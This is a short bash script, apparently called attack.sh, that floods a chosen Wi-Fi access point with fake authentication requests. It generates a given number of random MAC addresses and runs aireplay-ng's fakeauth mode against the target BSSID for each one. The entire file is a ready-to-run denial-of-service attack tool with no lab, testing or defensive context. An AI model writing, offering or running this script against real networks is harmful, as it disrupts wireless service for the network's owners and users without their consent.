#Test whether you have entered the correct syntax or not
if [ $# -ne 3 ];then
    echo 'Invalid Syntax'
    echo 'attack.sh <number_of_fake_addresses> <target_network_bssid> <adapter_name>'
    exit
fi

#$1 is number of address you want, $2 is mac AP, $3 is adapter
#Create random MAC Address
for (( i=0;i<$1;i++ ))
do
    mac=''
    for (( j=0;j<6;j++ ))
    do
        num=$RANDOM
        (( num %= 9 ))
        mac=$mac$num
        num=$RANDOM
        (( num %= 9 ))
        mac=$mac$num
        if (( j != 5 ));then
            mac=$mac:
        fi
    done
    cmd='sudo aireplay-ng --fakeauth 0 -a '$2' -h '$mac' '$3
    clear
    $cmd
done
